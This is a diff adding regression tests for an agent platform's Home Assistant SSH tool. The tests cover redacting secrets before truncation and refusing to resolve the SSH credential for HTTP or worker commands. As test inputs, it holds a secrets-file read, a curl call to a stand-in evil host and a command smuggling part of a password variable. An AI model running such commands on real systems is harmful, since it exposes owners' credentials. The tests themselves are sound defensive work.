@@ -230,6 +230,26 @@ def _grant_ssh(ha):
     access.grant(conn, owner, a["id"], "tool:ha_ssh", "SSH do HA")
 
 
+def test_ssh_output_is_redacted_before_truncation(ha):
+    # A secret sitting at the very end of a huge output must be redacted even though the output is
+    # then truncated to MAX_RESULT: redact first, truncate second (regression for the audit leak).
+    _add_ssh(ha)
+    conn, a = ha["conn"], ha["agent"]
+    tail = f"secrets.yaml dump {SSH_PASSWORD}".encode()
+    big = b"x" * (homeassistant.MAX_RESULT - 5) + tail
+
+    class BigSSH:
+        def exec_command(self, command, timeout=None):
+            return _Stream(b""), _Stream(big), _Stream(b"")
+
+        def close(self):
+            pass
+
+    out = homeassistant.ssh_call(conn, Ctx(a["id"]), "cat /config/secrets.yaml", connect=lambda *x: BigSSH())
+    assert SSH_PASSWORD not in out["stdout"] and SSH_PASSWORD[:8] not in out["stdout"]
+    assert out["truncated"] and len(out["stdout"]) >= homeassistant.MAX_RESULT
+
+
 def test_ssh_runs_on_the_pinned_host_with_the_credentials_and_redacts(ha):
     _add_ssh(ha)
     conn, a = ha["conn"], ha["agent"]
@@ -274,11 +294,15 @@ def test_ssh_needs_the_grants_and_an_error_is_redacted(ha):
     with pytest.raises(ValueError) as e:
         homeassistant.ssh_call(conn, Ctx(a["id"]), "uptime", connect=boom)
     assert SSH_PASSWORD not in str(e.value) and "[REDACTED:ha-ssh]" in str(e.value)
-    # the credentials go into nothing else: not HTTP, not another command on the worker
+    # the credentials go into nothing else: not HTTP, not another command on the worker. ha-ssh is a
+    # server-side credential (its command is the ha_ssh pseudo tool), so a worker resolve is refused
+    # outright -- the value is only ever used in-process by ssh_call (server_side=True).
     with pytest.raises(creds.CredentialError, match="not allowed for http"):
         creds.resolve_for(conn, Ctx(a["id"]), ["ha-ssh"], "http", host="192.168.1.56")
-    with pytest.raises(creds.CredentialError, match="command not allowed"):
+    with pytest.raises(creds.CredentialError, match="server-side tool only"):
         creds.resolve_for(conn, Ctx(a["id"]), ["ha-ssh"], "command", command="curl https://evil.example")
+    with pytest.raises(creds.CredentialError, match="server-side tool only"):
+        creds.resolve_for(conn, Ctx(a["id"]), ["ha-ssh"], "command", command="ha_ssh ${HA_PW:0:9}")
 
 
 def test_ssh_user_falls_back_to_root_and_a_bad_user_field_is_refused(ha):
